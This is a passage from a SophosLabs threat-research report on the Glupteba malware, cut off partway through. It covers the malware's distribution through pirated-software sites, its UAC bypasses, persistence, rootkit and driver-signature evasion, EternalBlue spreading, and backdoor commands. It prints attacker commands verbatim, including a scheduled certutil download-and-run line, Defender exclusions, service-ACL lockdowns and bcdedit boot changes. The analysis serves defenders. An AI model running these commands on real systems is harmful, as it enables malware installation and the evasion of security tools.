{
    "id": "ac2a5890-09ce-42de-883a-301f0bee0c2e",
    "created_at": "2022-10-25T16:48:14.66905Z",
    "updated_at": "2025-03-27T02:16:59.137363Z",
    "deleted_at": null,
    "sha1_hash": "a9c9b4910bd75eb90a8fa7110bceb70b65532110",
    "title": "Microsoft Word - glupteba_final.docx",
    "authors": "",
    "file_creation_date": "2020-06-24T08:48:07Z",
    "file_modification_date": "2020-06-24T08:48:07Z",
    "file_size": 5599548,
    "plain_text": "# Glupteba: Hidden Malware Delivery in Plain Sight \n\n## Inside a self-concealing malware distribution framework with a security-resistant ecosystem \n\n#### Luca Nagy, SophosLabs\n\n June, 2020\n\n\n-----\n\n#### About a month ago, one of my colleagues noticed a spike in the number of samples belonging to the same malware campaign, most of them with the filename \"app.exe.\" This malware, which turned out to belong to a family called Glupteba, spreads using EternalBlue, and downloads additional payloads. At the same time, we got some hints that the malware had been targeted at the online gaming community, and that this had been happening since mid-January.\n\n Coincidentally, another coworker called my attention to an interesting research warning about a rise in the use of pay-per-install networks, and the misconception that these services are only associated with adware. This research referenced cases in January where a variety of malware – including DreamBot, Raccoon Stealer, and Glupteba – were being spread by a pay-per- install adware vendor called InstallCapital. [1]\n\n At around the same time, malware researcher Vitali Kremez was issuing warnings about destructive malware that claimed to be ransomware, and maliciously misidentified Kremez as its creator. Based on some victims’ experience, the malware may have been downloaded by a Glupteba loader that had been promoted as a pirated software installer. \n\n Inspired by this confluence of coincidences, I decided to investigate Glupteba. What really grabbed my attention was the dropper’s self-defense capabilities: By continuously monitoring its components, even specific services, it was able to thwart efforts at removing it from an infected machine. Glupteba also takes a variety of approaches to lay low and avoid being noticed. Besides its information-stealing, router-exploiter, and Web proxy capabilities, Glupteba has been making efforts at improving its exhaustive backdoor function list, loader responsibilities, and network communication.\n\n© 2020, SophosLabs 2\n\n\n-----\n\n#### Table of Contents\n\nExecutive summary .................................................................................................................... 4\n\nWhere does Glupteba come from? ............................................................................................ 4\n\nGlupteba main dropper component: Its structure and functions ...................................... 6\n\nInitializing the dropper .......................................................................................................... 8\n\nObserving the environment and installation ..................................................................... 12\n\nRegistering the bot with the Glupteba network ................................................................ 13\n\nGlupteba's rootkit driver, concealment, and self-defense ............................................... 15\n\nThe \"watcher\" components ................................................................................................ 16\n\nPolling and handling the commands ................................................................................. 19\n\nComponents for concealment ............................................................................................. 21\n\nDisabling DSE ..................................................................................................................... 21\n\nDisabling PatchGuard and DSE ........................................................................................ 21\n\nComponents for spreading on LAN ..................................................................................... 25\n\nNetwork communication ........................................................................................................ 26\n\nConfiguring the content delivery network (CDN) server ................................................. 26\n\nC2 servers ........................................................................................................................... 27\n\nC2 domain update using the blockchain ............................................................................ 30\n\nHistorical order of the C2 domain updates ....................................................................... 32\n\nGlupteba's payload components ......................................................................................... 33\n\nCommunications proxy component - \"cloudnet.exe\"....................................................... 33\n\nC2 server communication .................................................................................................. 33\n\nWatchdog component - \"windefender.exe\" ...................................................................... 36\n\nMikroTik RouterOS exploiter components ....................................................................... 38\n\nDNS cache poisoning - \"routerdns.exe\" and \"d2.exe\" .................................................... 40\n\nBrowser stealer components ............................................................................................. 43\n\nConclusion .................................................................................................................................. 46\n\nAcknowledgments .................................................................................................................. 47\n\nIOCs ......................................................................................................................................... 47\n\nReferences ............................................................................................................................. 47\n\n© 2020, SophosLabs 3\n\n\n-----\n\n### Executive summary\n\nThe name Glupteba represents both a malware family, and the malware distribution\nframework it creates by its presence on an infected computer. The bot has been\nconnected to historically large malware campaigns such as Operation Windigo.\n\nThe Glupteba bot, essentially a dropper for a succession of components that extend its\ncore functionality, exhibits a wide range of capabilities, including stealth (by means of a\nrootkit that leverages kernel drivers to conceal the bot components from view), lateral\nspread (using different implementations of the EternalBlue exploit), attacks against IoT\ndevices (primarily MikroTik consumer routers), the ability to deliver additional malware\npayloads on behalf of other threat actors (as well as functionality to itself via plugin\ncomponents), and a clever method of concealing updates to its list of command and\ncontrol servers by parsing and decrypting benign-looking comments in the bitcoin\ntransaction blockchain.\n\nGlupteba is still under constant development. Beside the previously mentioned features,\nthe bot has been enhancing a list of backdoor functions that include its ability to profile\nthe infected host, discover and exfiltrate sensitive information, and manipulate data and\nconfigurations on the infected device. The bot has been tied to what are alleged to be\ninstallers for popular commercial software applications or games, from sites that claim\nto provide pirated copies of that software.\n\n### Where does Glupteba come from? \n\nOne method Glupteba employs for spreading was exactly as it came onto our radar: the\nEternalBlue exploit. We observed Glupteba downloading and interacting with a file\nnamed deps.zip, which turned out to be related to the original Shadow Brokers exploit.\nIn some cases, we also found further evidence within another Glupteba payload named\ne7.exe, that leverages the same exploit but with a different implementation.\n\nI also followed up on another investigative thread, when I checked the reported cases\nabout the site hosting downloads of, ostensibly, pirated commercial software,\ncrackedion[.]com and downloaded what claimed to be a pirated version of Adobe\nIllustrator CS6. I confirmed that installing this application leads to Glupteba.\n\n© 2020, SophosLabs 4\n\n\n-----\n\nFirst, the downloader site redirected to a common link on this site (including a token and\nthe cracked software name to be downloaded), such as:\n\nhttps://dataf0ral1[.]com/mmd/?token=0dd12522f11f9gd22fa4f5b2139ca968bced823c&q=Adobe%20Illustrator%\n20CS6%20Full%20Crack%20With%20Serial%20Keygen%20{Latest%202019}%20Free\n\nHowever, that link further redirected to the Glutpeba downloader site - 1.podcast[.]best,\nwhile a \"-RTMD-<random>.exe\" string was added to the software file name in the URL. I\nwanted to test the theory that the \"-RTMD-\" string was unique to installers downloading\nGlupteba, which turned out to be correct; I found several Glupteba downloader sites\nwhile searching for this -RTMD- string in URIs. In these cases, the URI path also contains\nthe \"/ru53332/\" subfolder and all the filenames in that folder are associated with\ncracked software, such as:\n\n  - nova_launcher-prime-v6-RTMD-aii6ov7nggaavhwcaerffwasaffze7ma.exe\n\n  - wii+super+smash+bros+brawl+iso-RTMD\nalufov5ocgaavhwcaerffwagaczzjl4a.exe\n\n© 2020, SophosLabs 5\n\n\n-----\n\n  - freemake+video+converter+4-RTMD-ao-dnv7hiwaavhwcaerffwamahof74ma.exe\n\n  - fl+studio+20-RTMD-ahv9ov5chgaavhwcaerffwasaky_tzya.exe\n\nWhile chasing down this lead, I found another unique string of - FMLD- in several URLs.\nThese strings turned out to be related to a so-called distributor ID in the Glupteba\ndroppers. (I discuss the purpose of this later in this paper.) The URIs marked by the\nstring id of -FMLD- seems to be associated with video links on YouTube, as opposed to\nthe cracked software filenames.\n\nThis YouTube campaign started around the beginning of April. In these cases, the URI\npath contains the /ru5555/ subfolder, and the string -FMLD-0.exe is appended to the\nfilename. For example:\n\n  - _foxtrot_music_mix__1___youtube-fmld-0.exe\n\n  - 7_tips_for_healthy_living___youtube-fmld-0.exe\n\n  - introduction_to_ict___youtube-fmld-0.exe\n\n  - star_wars___order_66___hd_1080p___youtube-fmld-0.exe\n\n  - naruto_vs_sasuke__uicideboy____youtube-fmld-0.exe\n\n  - mike_tyson_training_2020-fmld-0.exe\n\n##### Glupteba main dropper component: Its structure and functions\n\nIn this section, we'll follow the flow of the Glupteba bot's internal instructions, as\nillustrated by the following subroutine map.\n\n© 2020, SophosLabs 6\n\n\n-----\n\n© 2020, SophosLabs 7\n\n\n-----\n\nInitializing the dropper\n\nThe main function of the Glupteba dropper (and most of its components, too) begins\nwith checking the essential directories: whether those are empty, and any installation\nfailure can be reported (1). The malware is capable of reporting failures at nearly all\nimportant phases of its execution by sending the appropriate failure message to the\nserver, using HTTP requests to the /api/install-failure URI path. The dropper, written in\nGo, uses a custom packer. It queries the username and active console session id with\nthe security identifier (2), and starts storing crucial config information in the Windows\nRegistry(3):\n\n\n_Figure 1: Registry keys set by the main Glupteba dropper_\n\n\nThe HKEY_USERS\\<SID>\\Software\\Microsoft\\TestApp Registry key path stores\ninformation necessary for the Glupteba dropper and components, such as the\naddresses of content delivery network (CDN) and command-and-control (C2) servers.\nThere is one CDN server and several C2 servers, used for different purposes.\n\nThe malware initially uses hardcoded domain names, but Glupteba can update this\ninformation after installation. Even these updates are unusual: Glupteba updates the\nCDN entry when it receives the appropriate command from the server, but the C2\nservers are updated by tracking transaction data from the Bitcoin blockchain.\n\nAlso stored in the Registry are version numbers, the latest commands received from the\nserver, process privileges, and a confirmation about the success of sending information\nabout the parent processes to the server.\n\nThe stored application name is generated by the an open-source random name\ngenerator (https://github.com/yelinaung/Go-haikunator) which it then modifies into\nCamelCase [2], which results in application names like \"SpringWater\" or \"DelicateSnow.\"\n\n© 2020, SophosLabs 8\n\n\n-----\n\nThe server provides the UUID when the bot first registers itself, and has important\nresponsibilities in later operations. The Firewall value indicates whether the firewall rules\n(for allowing incoming traffic) were added successfully. The malware adds itself to the\nWindows Defender exclusions list, which then prevents Defender from detecting\nGlupteba-related files and folders; if successful, it adds a value to the Defender key. The\nGlupteba dropper also records the FirstInstallDate here, and the version of the watchdog\nservice - one of its components.\n\nThe PDGSE Registry key value is set along with the PatchTime value, right before the\nmalware installs kernel drivers, when some kernel security evasion must be applied.\nTherefore, PDGSE can store several values, depending on the success of different\nevasion techniques. The VC value is set right after the browser stealer component came\ninto action. It configures the SC value when the ACL rules are used to strengthen the\ndefenses of Glupteba's rootkit drivers.\n\nData related to the OS are also queried and stored in the Registry, such as the OS\narchitecture and caption - queried by WMI commands: SELECT OSArchitecture FROM\n_Win32_OperatingSystem and SELECT Caption FROM Win32_OperatingSystem. Glupteba_\nstores the user privileges, and the presence of any antivirus software, obtaining by WMI\ncommands of SELECT displayName FROM AntiVirusProduct.\n\nFinally, it also queries, then stores, information about the infected hardware, such as the\nprocessor type and speed, amount of RAM, and the GPU - all queried by WMI commands,\ntoo.\n\nIn the (4) step, it sends the parent process names and PIDs to the C2 server along with\nsome information needed for identify the bot, like the distributor ID, campaign ID or the\nmachine GUID.\n\nThe distributor ID has been, so far, a one-digit ID, identifying the distributor of the\ndropper.\n\nIn cases when the binary doesn’t have any argument (e.g., it was downloaded from a\npirated software site like setbird[.]website), and the filename contains the -RTMDstring, the bot sets this \"distributor ID\" value as 6. If the filename contains the -FMLDstring and no argument, the distributor ID is assigned the value 5 (which happened\nwhen we downloaded it from maxbook[.]site/ru5555/).\n\nIf there's no argument and the files uses neither of these strings in the filename, the\ndistributor ID gets set to 4. Although, this ID can be arbitrary, in several cases we\nobserved that it was passed as a parameter in form of \" /<distributor_id><campaign_id>\" (or, more precisely, with the regular expression (\\/(\\d)-(.*))).\n\nIn contrast, the value the malware calls the \"campaign ID\" does not identify the specific\nattack campaign; Confusingly, the malware treats this five-digit ID as a designation\nabout the execution state of Glupteba. The designation campaign ID came the named Go\nfunctions of the examined sample, so this is how the bot's authors named it. It can be\nderived from the command line argument used to launch the Glupteba process. For\ninstance, in cases where the running process is downloaded from an update of the\n\n© 2020, SophosLabs 9\n\n\n-----\n\ndropper, which was launched by scheduled task, it always executes with /31340\nparameter, and this number becomes the campaign ID value.\n\nThe proxy component, for example, can be launched with /31339 or /31337 parameter depending on whether it is downloaded by a dropper’s watcher function (31339) or it is\nlaunched by a backdoor function (\"update-cloudnet,\" 31337). At the very beginning of\nthe infection, when the filename is still the name of the downloaded application, the\ncampaign ID determines this value from the string that follows -RMTD- or -FMLD-. For\ninstance, when the filename is:\n\nAdobeIllustratorCS6FullCrackWithSerialKeygenLatest2019}Free-RTMDAEIuk17nlgAA7xo.exe,\n\nthen the campaign id is:\n\nAEIuk17nlgAA7xo\n\nAt stage (5), depending on the process token privileges, the dropper attacks UAC.\n\nIn cases where the running OS anything earlier than Windows 10, it uses the\n_HKCU\\Software\\Classes\\mscfile\\shell\\open\\command Registry key with the default_\nRegistry key value, abusing the CompMgmtLauncher process to bypass the UAC and\nexecute the payload.\n\nIn cases where the victim's operating system is Windows 10, Glupteba uses the\nlegitimate Windows component fodhelper.exe to prevent the UAC prompt from\ndisplaying to the user, setting the HKCU\\Software\\Classes\\mssettings\\shell\\open\\command Registry key with a value of DelegateExecute so it can\nrun as a privileged process.\n\n_Figure 2: Depending on the OS version, Glupteba uses different UAC bypass techniques. Under Windows 10, it uses fodhelper.exe,_\n_while for other versions it uses CompMgmtLauncher._\n\n\nIn case the token privileges were elevated, the process checks whether the running\nprocess hasn’t been already a system-level process, because then it spawns a copy of\nitself and launches that as a TrustedInstaller service. This method requires\nadministrator privileges, but administrators don’t have rights for accessing system files,\nas opposed to the permission of a TrustedInstaller service. The TrustedInstaller service\n\n© 2020, SophosLabs 10\n\n\n-----\n\nwill be launched if it hasn’t been, yet. Since Glupteba uses kernel drivers for its rootkit,\nthis is necessary for success.\n\nRight after SeDebugPrivileges were enabled and the token can be accessed, the\nwinlogon.exe process is used to obtain a Trusted Installer token and to impersonate the\nlogged-on user process (as defined by WinSta0\\Default). So, the spawned process will\nhave NT AUTHORITY\\SYSTEM privileges at the end, the old exits.\n\nAfter these, at stage (6), the executable checks its parameter to execute different tasks:\n\n  - _\"- update <PID>\": PID can be defined in order to terminate. In case there is no PID_\n\nadded, then finds the app name from the Registry, sets Global\\csrss event while\nterminates the old process corresponding to the app name and, copies the binary\nagain to the \"%WINDIR%\\rss\" folder as csrss.exe. It launches the newly copied\ncsrss.exe with \"-cleanup\" parameter and exits. Besides, it cleans after it, so\ndeletes the old app name from autorun registy and deletes every file from its\nworking folder, like from the \"%TEMP%\\csrss\\smb\\ folder. Then the launched\nprocess, with its cleanup parameter, will remove the updater file.\n\n  - _\"-cleanup\": It removes the updater file._\n\n  - \"-hide <PID>\": It uses the \"\\\\\\\\.\\\\WinMon\" driver to unlink that EPROCESS from\n\nthe process list. It opens the driver and write the PID to the memory of it.\n\n  - _\"-uninstall\": It isn’t implemented._\n\n© 2020, SophosLabs 11\n\n\n-----\n\nObserving the environment and installation\n\nAt stage (7), the malware examines the environment and the running processes. If the\nrunning process is not correctly installed (%WINDIR%\\rss\\csrss.exe), then it checks\nwhether it's running inside a virtual machine.\n\nIt checks whether VirtualBox is running by opening \\\\.\\VBoxMiniRdrDN file, and it also\ncompares the running processes with the following ones:\n\n\n_Figure 3: Glupteba checks for a list of processes related to being run inside of a virtual machine_\n\n\nIt checks whether the app has been running by performing a WMI query and checks the\n_Global\\h48yorbq6rm87zot mutex to ensure it's running in the appropriate execution_\npath.\n\nBy stage (8), it's ready to complete the installation. However, before installing, the app\nperforms some self-defensive functions. It searches for the presence of an endpoint\nsecurity product by checking its distributor_ID value: if the distributor ID is 3, 4, 6, or 8, it\nassumes there's no AV product on the machine. If the distributor ID is 9, it assumes an\nAV exists on the machine, and it terminates its own process.\n\nIt adds some firewall rules to allow communication for csrss.exe (the installed Glupteba\napp), and for cloudnet.exe (the proxy module, discussed later in this report):\n\nC:\\Windows\\Sysnative\\cmd.exe /C \"netsh advfirewall firewall add rule\nname=\"csrss\" dir=in action=allow program=\"%WINDIR%\\rss\\csrss.exe\"\nenable=yes\"\n\nC:\\Windows\\Sysnative\\cmd.exe /C \"netsh advfirewall firewall add rule\nname=\"CloudNet\" dir=in action=allow program=\"%APPDATA%\\EpicNet\nInc\\CloudNet\\cloudnet.exe\" enable=yes\"\n\nIt adds Windows Defender exclusions for the Glupteba files and folders:\n\n_HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths Registry:_\n\n© 2020, SophosLabs 12\n\n\n-----\n\n  - %TEMP%\\csrss\n\n  - %TEMP%\\wup\n\n  - %APPDATA%\\EpicNet Inc\\CloudNet\n\n  - %APPDATA%\\<app_name>\n\n  - %WINDIR%\n\n  - %WINDIR%\\rss\n\n  - %WINDIR%\\System32\\drivers\n\n  - %WINDIR%\\windefender.exe\n\n_HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes:_\n\n  - cloudnet.exe\n\n  - csrss.exe\n\n  - <app_name>.exe\n\n  - windefender.exe\n\n_HKLM\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Processes_\n\n  - csrss.exe\n\n  - cloudnet.exe\n\n  - windefender.exe\n\n  - <app_name>.exe\n\nAfter that, the installation sets the Glupteba working directory to be a now-hidden folder,\n\"%WINDIR%\\rss\", copies the binary there, renames it to csrss.exe and gains persistence\nby registering the autorun Registry key\n(HKEY_USERS\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) with the\ngenerated app name and the \"%WINDIR%\\rss\\csrss.exe\" value. Then, it is executed with\nthe appropriate campaign ID as the parameter.\n\nAt point (9), it again checks execution path correctness, since in case the installed\ncsrss.exe is already running, then it double checks it using the\n_Global\\h48yorbq6rm87zot mutex and register the bot to the C2 server - in case the_\nUUID is still empty.\n\nRegistering the bot with the Glupteba network\n\nDuring registering the bot, at stage (10), it queries and sends tons of information to the\nserver. In addition to the stored config information, it also gathers and sends the OS\nbuild number, motherboard serial number, MAC address, disk drive serial number,\nmachine GUID, OS install date and amount of installed RAM to the C2. It obtains these\ndetails using queries of WMI or the Registry.\n\nAfter sending the registration package, the response is verified and he UUID will be used\nas a value under the HKEY_USERS\\%s\\Software\\Microsoft\\InstallKey Registry as well\nas will be stored in Registry configs - under the UUID name.\n\nDuring this post registration phase (11) it performs some additional operations (where\n%s represents the user's account SID in the Registry):\n\n© 2020, SophosLabs 13\n\n\n-----\n\n  - It creates the HKEY_USERS\\%s\\Software\\Microsoft\\RegisterAppProcessing\n\nkey in the Registry, then the dropper sends a poll request to the server, containing\na lot of information from the bot (explained in the \"Network communication and\ndomain update by blockchain\" section, below). If the server responds correctly\nand accepts the package, the dropper sets the\nHKEY_USERS\\%s\\Software\\Microsoft\\RegisterAppOk Registry key.\n\n  - It obtains all the installed apps on the system, querying from\n\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall Registry, then\nsending it to the server.\n\n  - It obtains the installed browsers from the\n\nHKEY_USERS\\%s\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAsso\nciations\\http\\UserChoice Registry by getting the value of Progid name field,\nthen sends it to the server, too.\n\n© 2020, SophosLabs 14\n\n\n-----\n\nGlupteba's rootkit driver, concealment, and self-defense\n\nThe next stage of the infection (12) is about gaining persistence for the bot (posing as\ncsrss.exe) by creating a scheduled task and applying living off the land techniques for\nupdating it. This is achieved by abusing certutil, invoked through the Task Scheduler. At\nthis point, the dropper launches the binary with the /31340 campaign ID:\n\n_schtasks /CREATE /SC ONLOGON /RL HIGHEST /TR \\\"%WINDIR%\\rss\\csrss.exe\\\" /TN csrss /F\"_\n\nschtasks /CREATE /SC ONLOGON /RL HIGHEST /RU SYSTEM /TR \\\"cmd.exe /C certutil.exe urlcache -split -f <server_name>/app/app.exe %TEMP%\\csrss\\scheduled.exe &&\n%TEMP%\\csrss\\scheduled.exe /31340\\\" /TN ScheduledUpdate /F\"\n\nThen at stage (13) Glupteba creates a hidden temporary directory and adds it to the\nDefender exclusions list, in order to get its updated version without Defender detecting it\nin %TEMP%\\csrss\n\nDepending on the passed parameter at (14) - say campaign ID - is /31340, then a\nscheduled install report is sent to the server along with the bot id (UUID), noting that the\npersistence has already been set by scheduled tasks.\n\nIn point (15) the rootkit drivers are installed. Depending on the different build numbers\nand OS architectures, it uses different binaries for running and installing the drivers\ncorrectly.\n\nFor instance, in case of Win 8 and Win 10, the secure boot is enabled by default. Secure\nboot helps preventing rootkits when computer boots, so in case it is not enabled, the\npatch.exe will be dropped to turn off the PatchGuard (only on 64 bit) by using a\nvulnerable VirtualBox kernel driver.\n\nThis wouldn’t succeed when secure boot is enabled. After turning off PatchGuard, it\nuses dsefix.exe (a tool that originated in a public Github repository) to disable Driver\nSignature Enforcement (which I discuss later in the Disabling DSE section). If both\nbinaries were dropped, it tries to terminate the PcaSvcP service after it installs the\nkernel drivers. The PcaSvcP service is responsible for notifying the user that an outdated\nprogram is running. So, for instance, after successfully turning it off, the bot can install\nand launch the Winmon driver. The dropper also creates a service instance of WinMonFS\ndriver and installs that driver, too.\n\nFinally, it installs and loads the WinmonProcessMonitor driver. In case the installed\nWinmon failed in hiding PIDs, the boot loader will be deleted with the use of bcedit.exe\nand then deletes the Winmon service in order to make attempts to reinstall it.\n\n© 2020, SophosLabs 15\n\n\n-----\n\nDuring driver installation, the bot sets the ACL by calling the following commands:\n\ncmd.exe /C sc sdset WinMon\nD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPLOCRSDRCWDWO;;;BA)(D;;WPDT;;;BA)(A;;CCLCSWLO\nCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\n\ncmd.exe /C sc sdset WinmonFS\nD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPLOCRSDRCWDWO;;;BA)(D;;WPDT;;;BA)(A;;CCLCSWLO\nCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\n\ncmd.exe /C sc sdset WinmonProcessMonitor\nD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPLOCRSDRCWDWO;;;BA)(D;;WPDT;;;BA)(A;;CCLCSWLO\nCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)A;\n\nThe part of \"(D;;WPDT;;;BA)\" is the most important as it can deny (D) to stop (WP), pause\nor continue (DT) the service to the built-in administrator group (BA), so afterwards,\nterminating the service is much more difficult. (If this succeeds, SC value in the config\nRegistry is set.)\n\nAt step (16) the dropper tries to hide itself using the Winmon rootkit driver. It writes the\nresult to the PDGSE Registry key (referenced in the Initializing the Dropper section,\nabove).\n\nAfter, (17) it hides the watchdog component - named \"windefender.exe\"-, and the proxy\ncomponent - named \"cloudnet.exe\" by using WinMon driver.\n\nAt stage (18) WinDefender service as well as the watchdog component of Glupteba is\ntracked here. It means it first checks whether the service hasn’t been created yet, then\ndownloads it from the CDN with the URI: \"/app/watchdog.exe?t=\" - where the \"t\"\nvariable signs the current time. Then, it launches itself as a service with name\nWinDefender. It also tracks the version number of it, updates it, removes the old one,\nand most importantly it hides it with WinMon driver by writing the PID to the memory of\nit. It is designed to an infinite loop, so it takes continuous responsibility of the service.\nThe service version and PDGSE is updated in Registry all along.\n\nThen, at stage (19) the Glupteba filenames are excluded from being displayed in\nWindows Explorer or other directory lists, using the \\.\\WinMonFS kernel driver, by\nwriting the filenames and folders to the driver memory.\n\nThe \"watcher\" components\n\nIn the next stage of the attack (20) several watcher/monitoring functions starts, like the\nWinDefender service watcher function at (18). These watcher functions track modules\nof Glupteba continuously, and are mostly responsible for hiding, relaunching, updating,\nor terminating other processes.\n\nCDN watcher\n\nIt continuously queries the server about the content delivery network (CDN) domain\nname with a GET request, and updates the Registry as needed. (More details on server\nstructure in the \"Network communication and domain update by blockchain\" section,\nbelow.)\n\n© 2020, SophosLabs 16\n\n\n-----\n\nWindows Update Service watcher\n\nIn an infinite loop, it continuously tries to terminate, then delete the Windows Updater\nservice.\n\nDefender watcher\n\nIt adds Windows Defender exclusions for the Glupteba files and folders every 10\nminutes.\n\nCloudnet watcher\n\nIt tracks whether the proxy component of Glupteba it is running, then downloads the\npayload from the requested cloudnet URL or from a hardcoded domain with the URI:\n/cl.exe, launch it and hide it with WinMon in every minutes. Global\\Mp6c3Ygukx29GbDk\nmutex is used, and MD5 hash calculated too. Cloudnet is launched with parameter - so\ncampaign id- of /31339.\n\nWup watcher\n\nDownload and hide an xmrig miner. Track and update, too.\n\nSMB watcher:\n\nThis function is responsible for spreading Glupteba on LAN.\n\nFirst, the host starts listening on tcp port 31461, before it starts searching SMB.\nDetection of tcp port 31461 works like an indicator that the infection has taken place,\nsince during scanning the LAN, the bot initially checks to see if port 31461 is active. The\nSMB vulnerability checking for MS17-010 is implemented here in the dropper. It checks\nport 445, connects to an IPC$ tree, and determines whether the status returned for a\ntransactions on FID 0 returns STATUS_INSUFF_SERVER_RESOURCES (0xC0000205)\n(seen below), which means the tested host doesn’t have the MS17-010 patch installed.\n\n_Figure 4: Glupteba checks whether the host is vulnerable to the EternalBlue exploit by checking the status returned to a specific SMB_\n_transaction._\n\nThe dropper reports about the vulnerable hosts discovered on the network to the bot's\nC2 server, then downloads the original Shadow Brokers EternalBlue exploit package\nalong with payload DLLs written in Go. It also downloads a different implementation of\nEternalBlue's exploit to the \\smb folder of the Glupteba directory, just for good measure.\n\n© 2020, SophosLabs 17\n\n\n-----\n\nTherefore, it has capability to use two different implementations of the EternalBlue\nexploit: One is implemented in deps.zip, the other in e7.exe and used with shellcode\nembedded in the main Glupteba binary.\n\n(The downloaded or dropped components are checked later.)\n\n_Figure 5: Glupteba will try to use the original EternalBlue exploit, and uses_\n_an alternative implementation if the first one fails._\n\n\n© 2020, SophosLabs 18\n\n\n-----\n\nPolling and handling the commands\n\nThe last stage - the end loop - of the dropper code (21) is responsible for continuously\npolling for new commands from the server, and handling them using its backdoor\nfunctions. The malware checks the servers in each iteration of the infinite loop by\ntracking Bitcoin (btc) blockchain transactions - this is examined in detail later.\n\nThe following lists are the Glupteba backdoor functions, which can execute commands;\ndownload and launch binaries; notify other bots; request configuration information;\nlaunch (or relaunch) components; and/or query running processes. Components even\ncan upload files to the server and verifying signatures:\n\n  - update: updates the binary to the \"%TEMP%\\csrss\" folder - downloads and\n\nexecutes it\n\n  - get_app_name: returns with the value of \"Name\" Registry name, from the config\n\nregistries\n\n  - is_admin: checks whether the user has admin privileges\n\n  - process_is_running: checks a process by querying with SELECT Name FROM\n\nWin32_Process WHERE Name = X\n\n  - exec: executes any command in command line, output is directed back\n\n  - download: downloads from an URL to the \"%TEMP%\\csrss\" folder\n\n  - run: downloads and run from an URL to \"%TEMP%\\csrss\" folder\n\n  - run-v2: downloads and run from an URL with a prepared command\n\n  - exit: terminates the binary\n\n  - update-data: sends information to the server - same information sent as during\n\nregistration, only difference that these are sent to the C2 server with\n/bots/update-data URI\n\n  - update-cloudnet: asks cloudnet URL by /api/cloudnet-url? and sets event of\n\nGlobal\\\\Mp6c3Ygukx29GbDk while downloading to the proper folder, then\nreplace it, runs it, and creates %APPDATA%\\EpicNet Inc\\CloudNet folder to move\nit. The binary is launched with parameter of /31337 in this case.\n\n  - stop-wup: sets event of Global\\wupEvent31337 (used by the miners)\n\n  - stop-wupv: sets event of Global\\xneEvent31337(used by the miners)\n\n  - stop-mrt: sets event of Global\\y7ze3fznx1u0yc2z\n\n  - notify: notifies a URL at an interval (can use several different protocols, like HTTP,\n\nTLS, UDP pack…)\n\n  - notify-host: notifies host for HTTP\n\n  - event-exists : checks a global event whether exist\n\n  - mutex-exists: checks a global mutex whether exist\n\n  - Registry-get-startup: queries\n\nHKEY_USERS\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n  - verify-signature: verifies the PE file signature - filename is in command - (uses\n\nwinapi - VerifySignature)\n\n  - Registry-get-startup-signatures: verifies the PE files signatures from autorun\n\nRegistry (uses winapi - VerifySignature)\n\n© 2020, SophosLabs 19\n\n\n-----\n\n  - verify-processes-signatures: enumerates the processes, check signatures of\n\nthem\n\n  - get-unverified-files: reports about unverified files\n\n  - get-stats-wup: asks by GET method of localhost:3433, which is the api port of the\n\nminer\n\n  - upload-file: upload a file by using PUT method with %s/upload/%s/samples/%\n\nURI\n\n  - update-service: checks service version of WinDefender, update it\n\n(/app/watchdog.exe?) if necessary (also hides it and removes the old)\n\n  - get-logfile-proxy: reads \\\\proxy\\\\t file\n\n  - install: downloads and runs file, then sends install report\n\n  - get-logfile-i2pd: reads \\\\i2pd\\\\i2pd.log\n\n  - sc: takes screenshots\n\n  - update-cdn: updates CDN\n\n  - discover-electrum: uses electrum to update domain server (uses hardcoded\n\nscript hash)\n\n  - discover-blockchaincome: uses btc to update domain server (uses hardcoded btc\n\naddress)\n\n© 2020, SophosLabs 20\n\n\n-----\n\n##### Components for concealment\n\nGlupteba's developer(s) put a lot of work into the bot's capabilities to conceal itself from\ndiscovery, which includes working at all times without triggering any failure or alerts. It\nhas several watcher functions which continuously monitor Glupteba's payloads in an\ninfinite loop, and takes care on updating, restarting and hiding them by applying several\ntechniques and tools. Besides applying hiding techniques such as unlinking from\nprocess list, it also check afterwards and stores the success of them (like store in\nPDGSE).\n\nBesides continuously avoiding Windows Defender detection by excluding Glupteba files\nand folders, the main dropper binary contains rootkit drivers for hiding or terminating\nservices. In order to install and use these drivers correctly, some technique and tool is\nused.\n\nDropper has some open source tools embedded in it to evade kernel security and install\nthe kernel drivers without failures:\n\nDisabling DSE\n\nThe dsefix.exe tool (https://github.com/hfiref0x/DSEFix) uses a VirtualBox kernel\nmode exploit (first popularized by Turla) to override Driver Signature Enforcement (DSE),\nwhich is located in kernel memory space. This tool drops a vulnerable VBoxDrv.sys driver\nto the system and rewrites the global variables which control the DSE.\n\nThe shellcode can use the following values for controlling the DSE:\n\n_Figure 6: Glupteba uses the open-source dsefix.exe tool to_\n_modify DSE values_\n\nDisabling PatchGuard and DSE\n\nEmbedded in the bot is a second open source tool designed to disable the PatchGuard\nand DSE security features within Windows: patch.exe\n\n© 2020, SophosLabs 21\n\n\n-----\n\n(https://github.com/hfiref0x/UPGDSED) launches several instances of the bcdedit.exe\nprocess, using the following parameters:\n\n_C:\\Windows\\system32\\bcdedit.exe -create {71A3C7FC-F751-4982-AEC1-E958357E6813} -d \"Windows Fast Mode\" -_\n_application OSLOADER_\n\n_C:\\Windows\\system32\\bcdedit.exe -set {71A3C7FC-F751-4982-AEC1-E958357E6813} device partition=C:_\n\n_C:\\Windows\\system32\\bcdedit.exe -set {71A3C7FC-F751-4982-AEC1-E958357E6813} osdevice partition=C:_\n\n_C:\\Windows\\system32\\bcdedit.exe -set {71A3C7FC-F751-4982-AEC1-E958357E6813} systemroot \\Windows_\n\n_C:\\Windows\\system32\\bcdedit.exe -set 